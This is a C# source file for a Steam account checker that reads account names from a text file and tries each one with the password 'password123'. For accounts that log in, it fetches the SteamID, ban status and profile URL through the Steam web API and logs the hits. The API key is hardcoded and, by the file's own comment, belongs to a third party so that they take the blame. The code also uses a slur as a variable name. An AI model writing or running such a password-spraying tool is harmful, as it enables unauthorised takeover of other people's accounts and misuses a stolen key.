using System;
using System.Collections.Generic;
using System.Threading;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using SteamKit2;
using Newtonsoft.Json.Linq;

namespace steam
{
    class moschino
    {
        public int AccountsFound;
        private List<Config.Account> Accounts = new List<Config.Account>();
        private Config.Settings Settings;
        private Log Log;
        private Thread SearchThread;
        
        public moschino(Config.Settings settings)
        {
           //init
            Settings = settings;
            Log = new Log("accountss.txt", 1);
          
            SearchThread = new Thread(Work);
            SearchThread.Start();
        }

        private void Work()
        {
            var accounts = new Config.Account();
            //load our accounts from txt file
            string loadaccs = File.ReadAllText("accounts.txt");
            using (StringReader rdr = new StringReader(loadaccs))
            {
                //read the txt file line by line & check the account
                string account;
                while ((account = rdr.ReadLine()) != null)
                {
                    if (account.Length < 2)
                        continue;

                    string[] array = account.Split("\r\n".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                    foreach (String j in array)
                    {
                        //gotta sleep otherwise too fast
                        Thread.Sleep(500);
                        Console.WriteLine("Checking account " + account);
                    }

                    string SteamAccountToRead = account;

                    //check if the steam account is valid
                   if (IsSteamAccGood(SteamAccountToRead))
                    {
                    }

                }
            }
            Console.WriteLine("\n Finished");
            Log.FlushLog(true);
        }
        
        public static string GetStringBetween(string source, string start, string end)
        {
            int startIndex = source.IndexOf(start);
            if (startIndex != -1)
            {
                int endIndex = source.IndexOf(end, startIndex + 1);
                if (endIndex != -1)
                {
                    return source.Substring(startIndex + start.Length, endIndex - startIndex - start.Length);
                }
            }
            return string.Empty;
        }

        
        public static string GetSteamId(string steamId64)
        {
            return GetSteamId(long.Parse(steamId64));
        }
        //1000iq 64 -> regular sid conversion
        public static string GetSteamId(long steamId64)
        {
            long universe = steamId64 - 76561197960265728L & 1L;
            long num = (steamId64 - 76561197960265728L - universe) / 2L;
            return string.Format("STEAM_0:{0}:{1}", universe, num);
        }

        private bool IsSteamAccGood(string accountname)
        {
            var accounts = new Config.Account();
            //retrieve the good stuff ;)
            Config.UserInfo UserInfo = Class1.RetrieveInfo(accountname, "password123");
            if (UserInfo.steamid.Length > 5)
            {
                using (WebClient webClient = new WebClient())
                {
                    try
                    {
                        //lets use rezonans api key so we know whos to blame
                        Config.RootObject rootObject = (JObject.Parse(webClient.DownloadString("https://api.steampowered.com/ISteamUser/GetPlayerBans/v0001/?steamids=" + UserInfo.steamid + "&key=2FD6A7B83C334E2CE65868A38A6F3F6E")).Values().First<JToken>() as JArray).First<JToken>().ToObject<Config.RootObject>();
                      
                        accounts.email = accountname;
                    
                        string homo;
                        homo = GetSteamId(UserInfo.steamid);
                        accounts.steamid = homo;
                  
                        //ghett9
                        string geturl = webClient.DownloadString(string.Format("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?steamids=" + UserInfo.steamid + "&key=2FD6A7B83C334E2CE65868A38A6F3F6E&format=xml"));
                        if (geturl.Contains("profileurl"))
                        {
                            string url = GetStringBetween(geturl, "<profileurl>", "</profileurl>");
                            accounts.url = url;
                        }

                        Console.BackgroundColor = ConsoleColor.Blue;
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("Found account: {0} {1} {2}", accounts.email, accounts.steamid, accounts.url);
                        Console.ResetColor();
                        Log.Write(accounts);
                        AccountsFound++;
                    }
                    catch
                    {
                        //catch exception 
                    }
                }
            }
            return true;
        }



    }
}
